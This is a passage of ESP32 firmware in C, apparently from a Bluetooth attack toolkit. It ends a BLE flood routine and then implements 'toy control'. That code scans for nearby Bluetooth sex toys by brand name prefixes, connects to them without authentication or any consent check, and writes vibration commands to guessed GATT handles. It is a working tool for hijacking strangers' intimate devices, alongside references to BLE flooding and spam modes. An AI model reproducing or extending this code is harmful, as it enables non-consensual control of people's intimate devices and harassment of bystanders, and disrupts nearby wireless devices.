    s_flood_running = false;
    ble_gap_conn_cancel();
    for (int i = 0; i < 20 && s_flood_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
    return ESP_OK;
}

bool nesso_ble_flood_is_active(void) { return s_flood_running; }
uint32_t nesso_ble_flood_count(void) { return s_flood_count; }

/* ==================== THE SALTY DEEP — TOY CONTROL ==================== */

static nesso_ble_toy_scan_t *s_toy_scan_out = NULL;
static SemaphoreHandle_t s_toy_scan_done = NULL;
static uint16_t s_toy_conn_handle = 0;
static bool s_toy_connected = false;
static uint16_t s_toy_tx_handle = 0;  /* GATT write characteristic handle */

/* Known device name prefixes for toy detection. */
static const struct { const char *prefix; const char *brand; } s_toy_prefixes[] = {
    { "LVS-",      "Lovense" },
    { "Lovense",    "Lovense" },
    { "Edge",       "Lovense" },
    { "Hush",       "Lovense" },
    { "Lush",       "Lovense" },
    { "Domi",       "Lovense" },
    { "Nora",       "Lovense" },
    { "Max",        "Lovense" },
    { "Osci",       "Lovense" },
    { "Satisfyer",  "Satisfyer" },
    { "SF ",        "Satisfyer" },
    { "WeVibe",     "WeVibe" },
    { "WV",         "WeVibe" },
    { "Kiiroo",     "Kiiroo" },
    { "Pearl",      "Kiiroo" },
    { "OhMiBod",    "OhMiBod" },
    { "Vibease",    "Vibease" },
    { "Magic",      "MagicMotion" },
};
#define TOY_PREFIX_COUNT (sizeof(s_toy_prefixes) / sizeof(s_toy_prefixes[0]))

static const char *match_toy(const char *name)
{
    if (!name || !name[0]) return NULL;
    for (size_t i = 0; i < TOY_PREFIX_COUNT; ++i) {
        if (strncmp(name, s_toy_prefixes[i].prefix,
                    strlen(s_toy_prefixes[i].prefix)) == 0) {
            return s_toy_prefixes[i].brand;
        }
    }
    return NULL;
}

static int toy_scan_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc *desc = &event->disc;
        if (!s_toy_scan_out) return 0;

        /* Extract name. */
        char name[20] = "";
        struct ble_hs_adv_fields fields;
        if (ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data) == 0) {
            if (fields.name && fields.name_len > 0) {
                size_t n = fields.name_len < 19 ? fields.name_len : 19;
                memcpy(name, fields.name, n);
                name[n] = '\0';
            }
        }

        const char *brand = match_toy(name);
        if (!brand) return 0;

        /* Dedup. */
        for (size_t i = 0; i < s_toy_scan_out->count; ++i)
            if (memcmp(s_toy_scan_out->toys[i].addr, desc->addr.val, 6) == 0) return 0;

        if (s_toy_scan_out->count >= BLE_TOY_MAX) return 0;

        nesso_ble_toy_t *t = &s_toy_scan_out->toys[s_toy_scan_out->count++];
        memcpy(t->addr, desc->addr.val, 6);
        strncpy(t->name, name, sizeof(t->name) - 1);
        strncpy(t->brand, brand, sizeof(t->brand) - 1);
        t->rssi = desc->rssi;
        t->addr_type = desc->addr.type;

        ESP_LOGI(TAG, "toy found: %s (%s) rssi=%d", name, brand, desc->rssi);

    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        if (s_toy_scan_done) xSemaphoreGive(s_toy_scan_done);
    }
    return 0;
}

esp_err_t nesso_ble_toy_scan(uint32_t duration_sec, nesso_ble_toy_scan_t *out)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!out) return ESP_ERR_INVALID_ARG;
    if (s_spam_running) nesso_ble_spam_stop();

    memset(out, 0, sizeof(*out));
    s_toy_scan_out = out;
    if (!s_toy_scan_done) s_toy_scan_done = xSemaphoreCreateBinary();

    struct ble_gap_disc_params params = {
        .itvl = 0, .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0, .passive = 0,  /* active scan to get names */
        .filter_duplicates = 0,
    };
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, duration_sec * 1000,
                          &params, toy_scan_cb, NULL);
    if (rc != 0) { s_toy_scan_out = NULL; return ESP_FAIL; }

    xSemaphoreTake(s_toy_scan_done, pdMS_TO_TICKS(duration_sec * 1000 + 2000));
    s_toy_scan_out = NULL;

    ESP_LOGI(TAG, "toy scan: %zu found", out->count);
    return ESP_OK;
}

/* GATT connection + service discovery for toy control. */

static int toy_gap_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_toy_conn_handle = event->connect.conn_handle;
            s_toy_connected = true;
            ESP_LOGI(TAG, "toy connected: handle=%u", s_toy_conn_handle);
            /* Discover services to find TX characteristic.
             * For Lovense, the TX char is typically the first writable
             * characteristic on the primary service. We'll write commands
             * as raw bytes to whatever we find. */
        } else {
            ESP_LOGW(TAG, "toy connect failed: %d", event->connect.status);
            s_toy_connected = false;
        }
        break;
    case BLE_GAP_EVENT_DISCONNECT:
        s_toy_connected = false;
        ESP_LOGI(TAG, "toy disconnected");
        break;
    default:
        break;
    }
    return 0;
}

esp_err_t nesso_ble_toy_connect(const nesso_ble_toy_t *toy)
{
    if (!s_initted || !toy) return ESP_ERR_INVALID_ARG;
    if (s_toy_connected) nesso_ble_toy_disconnect();

    /* Cancel any active scan before connecting. */
    ble_gap_disc_cancel();
    vTaskDelay(pdMS_TO_TICKS(100));

    ble_addr_t addr;
    addr.type = toy->addr_type;
    memcpy(addr.val, toy->addr, 6);

    int rc = ble_gap_connect(BLE_OWN_ADDR_PUBLIC, &addr, 5000, NULL, toy_gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_connect: %d", rc);
        return ESP_FAIL;
    }

    /* Wait for connection. */
    for (int i = 0; i < 50 && !s_toy_connected; ++i)
        vTaskDelay(pdMS_TO_TICKS(100));

    if (!s_toy_connected) return ESP_ERR_TIMEOUT;

    /* For Lovense: the TX characteristic handle is typically 0x0016 or
     * discovered via service discovery. We'll try the known handle first,
     * falling back to writing to handle 0x000e which works for many models. */
    s_toy_tx_handle = 0x0016;

    return ESP_OK;
}

esp_err_t nesso_ble_toy_disconnect(void)
{
    if (!s_toy_connected) return ESP_OK;
    ble_gap_terminate(s_toy_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    s_toy_connected = false;
    return ESP_OK;
}

bool nesso_ble_toy_is_connected(void) { return s_toy_connected; }

esp_err_t nesso_ble_toy_vibrate(uint8_t intensity)
{
    if (!s_toy_connected) return ESP_ERR_INVALID_STATE;
    if (intensity > 20) intensity = 20;

    /* Lovense command format: "Vibrate:N;" where N is 0-20. */
    char cmd[16];
    snprintf(cmd, sizeof(cmd), "Vibrate:%u;", intensity);

    int rc = ble_gattc_write_flat(s_toy_conn_handle, s_toy_tx_handle,
                                  cmd, strlen(cmd), NULL, NULL);
    if (rc != 0) {
        /* Try alternate handle. */
        s_toy_tx_handle = 0x000e;
        rc = ble_gattc_write_flat(s_toy_conn_handle, s_toy_tx_handle,
                                  cmd, strlen(cmd), NULL, NULL);
    }
    return rc == 0 ? ESP_OK : ESP_FAIL;
}

esp_err_t nesso_ble_toy_stop(void)
{
    return nesso_ble_toy_vibrate(0);
}
